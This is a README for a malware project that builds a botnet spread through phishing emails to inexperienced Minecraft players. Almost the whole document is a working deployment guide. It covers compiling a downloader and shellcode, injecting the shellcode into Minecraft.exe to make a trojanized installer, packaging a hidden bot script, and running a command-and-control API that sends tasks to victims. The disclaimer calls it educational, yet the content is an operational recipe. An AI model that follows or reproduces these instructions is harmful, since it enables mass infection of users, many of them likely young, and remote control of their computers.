# MALW-MinecraftBotnet

MinecraftBotnet is a project developed to create an automated botnet which propagates through phishing emails. The target audience would be unexperienced users that play Minecraft.

> [!CAUTION]
> **DISCLAIMER: This project was made for educational purposes. We are not responsible for the use you give it.**

## Structure

This project was divided in 5 sections that focuses in different aspects of the botnet.

1. [API](/API/): Simple webserver API which will provide all available files to be downloaded and schedule each machine, inside the botnet, to execute the desired tasks.
1. [InfectPE](/InfectPE/): This folder contains a self-version program which allows to inject shellcode into any executable via the creation of a new section. Original version [InfectPE](https://github.com/secrary/InfectPE).
1. [Malware](/Malware/): Main program that executes in the victim's computer.
1. [Payload](/Payload/): The shellcode script that will be injected into the executable, and another c++ script that will be downloaded by the shellcode, in charge of setting up the malware in the victim's computer.
1. [Scripts](/Scripts/): This folder contains the task that is executed by the malware.

## Instructions:

### Compiling shellcode and mainDownloader
Maindownloader:

- `$ cd /Payload`
- `$ gcc -m32 MainDownloader.c -o MainDownloader.exe -lurlmon`
- Now, you can place the generated executable inside [API downloads folder](/API/downloads).


Payload (shellcode):
* `$ cd /Payload`
* `$ ./ShellcodeCompiler_x64.exe -r payload.cpp -a _assembly.asm -p win_x86`
* Inside the generated file `_assembly.asm` you must manually modify the assembly instruction to fix a bug. You must replace the instruction `mov eax, fs:[ecx + 0x30]` with `mov eax, [fs:ecx + 0x30]`.
* `$ nasm -g -f win32 _assembly.asm -o _assembly.o`
* `$ C:/MinGW/bin/ld.exe -g -mi386pe _assembly.o -o _assembly.exe`
>
* `$ objdump -d _assembly.exe`
  * ¡Gitbash required or any alternative! *See tmp.txt file to see the desired output
* Paste the .text section inside tmp.txt file
* `$ python dumpShellcode.py tmp.txt`

> [!TIP]
> You can use any other alternative to ouput the shellcode from an excutable.

> [!WARNING]
> We have encountered several errors with the gcc distribution. To compile the MainDownloader, we have used the `LLVM` distribution; however, for the shellcode part we have used `MinGW`.

> [!IMPORTANT]
> You will need gcc for mutiplatform (32 bits) and nasm installed.

### Compiling the tasks
* `$ cd /Scripts`
* `$ python -m PyInstaller --onefile --noconsole times.py`
* Now, you can place the generated executable inside [API downloads folder](/API/downloads).

> [!IMPORTANT]
> You will need python installed with the module PyInstaller.

### Compiling the malware
* `$ cd /Malware`
* `$ python -m PyInstaller --onefile --noconsole botScript.py`
* Now, you can place the generated executable inside [API downloads folder](/API/downloads).

> [!IMPORTANT]
> You will need python installed with the module PyInstaller.

### Infecting the Minecraft executable
* Paste the shellcode generated previously inside the file `infectPE.cpp` - `char shellcode[] =`.
>
* `$ g++ -c PE.cpp -std=c++17`
* `$ g++ -c InfectPE.cpp -std=c++17`
* `$ g++ -o InfectPE.exe InfectPE.o PE.o`
* `$ ./InfectPE.exe ./Minecraft/Minecraft.exe ./Minecraft/Minecraft_Infected.exe`
* Now, you can place `./Minecraft/Minecraft_Infected.exe` inside [API downloads folder](/API/downloads).

## Running the Botnet server:
Before starting the server, remember to change the IP address depending on how you setup the network or the server itself (you could use directly `0.0.0.0:80`) inside `/API/BotnetAPI.py`.
> [!IMPORTANT]
> Keep in mind, that changing the IP implies changing the following files: payload.cpp, MainDownloader.c, botScript.py, and BotnetAPI.py. In addition, changing the payload and the MainDownloader involves translating to asm, compiling, and replacing the shellcode string again in infectPE.cpp. 

* `$ cd /API`
* `$ pip install -r requirements.txt`
* `$ python BotnetAPI.py`

> [!IMPORTANT]
> You will need python installed.

> [!TIP]
> Theoretically, you can deploy this API to docker; however, it was not tested for this project.

## Considerations

As the configuration varies from one computer/VM to another, the IP's may vary as well. For that reason, you should replace any IP from the Payload, MainDownloader or Malware scripts.
